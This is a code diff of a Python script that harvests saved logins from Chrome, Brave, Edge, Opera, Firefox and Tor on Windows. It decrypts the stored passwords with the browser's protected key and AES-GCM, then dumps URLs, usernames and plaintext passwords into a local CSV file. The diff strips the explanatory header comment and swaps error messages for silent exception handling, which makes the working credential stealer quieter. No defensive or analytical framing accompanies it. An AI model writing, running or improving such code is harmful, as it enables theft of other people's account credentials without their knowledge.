@@ -1,8 +1,3 @@
-#This script is designed to extract saved passwords from various web browsers on a Windows system. 
-#It defines paths to the browser's user data directories and uses SQLite databases and AES decryption to retrieve stored login credentials. 
-#For Firefox, the script uses a separate method to decrypt passwords stored in the logins.json file. 
-#For browsers like Chrome, Brave, and Edge, it retrieves encrypted passwords from the "Login Data" SQLite database and decrypts them using the browser's secret key. 
-#The passwords are then written to a CSV file, including details such as the URL, username, password, and the current user.
 import os
 import re
 import sys
@@ -60,8 +55,7 @@ def get_firefox_passwords(profile_path):
             passwords.append((url, username, decrypted_password))
 
         return passwords
-    except Exception as e:
-        print(f"Error reading Firefox passwords: {e}")
+    except Exception:
         return []
 
 def get_secret_key(browser):
@@ -72,8 +66,7 @@ def get_secret_key(browser):
         secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
         return secret_key
-    except Exception as e:
-        print(f"[ERR] {browser} secretkey cannot be found: {str(e)}")
+    except Exception:
         return None
 
 def decrypt_password(ciphertext, secret_key):
@@ -82,8 +75,7 @@ def decrypt_password(ciphertext, secret_key):
         encrypted_password = ciphertext[15:-16]
         cipher = AES.new(secret_key, AES.MODE_GCM, iv)
         return cipher.decrypt(encrypted_password).decode('utf-8')
-    except Exception as e:
-        print(f"[ERR] Decryption failed: {str(e)}")
+    except Exception:
         return ""
 
 def get_db_connection(browser):
@@ -91,12 +83,12 @@ def get_db_connection(browser):
         db_path = os.path.join(BROWSER_PATHS[browser], 'Default', 'Login Data')
         shutil.copy2(db_path, "Loginvault.db")
         return sqlite3.connect("Loginvault.db")
-    except Exception as e:
-        print(f"[ERR] Database for {browser} cannot be found: {str(e)}")
+    except Exception:
         return None
 
 def process_browser_passwords(browser, secret_key, current_user, csv_writer):
     try:
+        passwords_saved = False
         if browser in ["chrome", "brave", "edge", "opera"]:
             for folder in os.listdir(BROWSER_PATHS[browser]):
                 if re.match(r"^Profile.*|^Default$", folder):
@@ -113,6 +105,7 @@ def process_browser_passwords(browser, secret_key, current_user, csv_writer):
                         cursor.close()
                         conn.close()
                         os.remove("Loginvault.db")
+                        passwords_saved = True
 
         elif browser in ["firefox", "tor"]:
             profiles = os.listdir(BROWSER_PATHS['firefox'])
@@ -121,26 +114,30 @@ def process_browser_passwords(browser, secret_key, current_user, csv_writer):
                 passwords = get_firefox_passwords(profile_path)
                 for index, (url, username, decrypted_password) in enumerate(passwords):
                     csv_writer.writerow([index, browser, url, username, decrypted_password, current_user])
+                    passwords_saved = True
 
-    except Exception as e:
-        print(f"[ERR] {browser} processing failed: {str(e)}")
+        if passwords_saved:
+            print(f"Successfully saved {browser.capitalize()} passwords.")
+
+    except Exception:
+        pass
 
 def extract_passwords():
     try:
         current_user = os.getlogin()
+        passwords_dir = "passwords"
+        os.makedirs(passwords_dir, exist_ok=True)
 
-        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        with open(os.path.join(passwords_dir, 'decrypted_password.csv'), mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index", "browser", "url", "username", "password", "user"])
 
             browsers = ["chrome", "brave", "edge", "opera", "firefox", "tor"]
             for browser in browsers:
-                print(f"Processing {browser.capitalize()} passwords...")
-                secret_key = get_secret_key(browser)
-                process_browser_passwords(browser, secret_key, current_user, csv_writer)
+                process_browser_passwords(browser, get_secret_key(browser), current_user, csv_writer)
 
-    except Exception as e:
-        print(f"[ERR] {str(e)}")
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     extract_passwords()
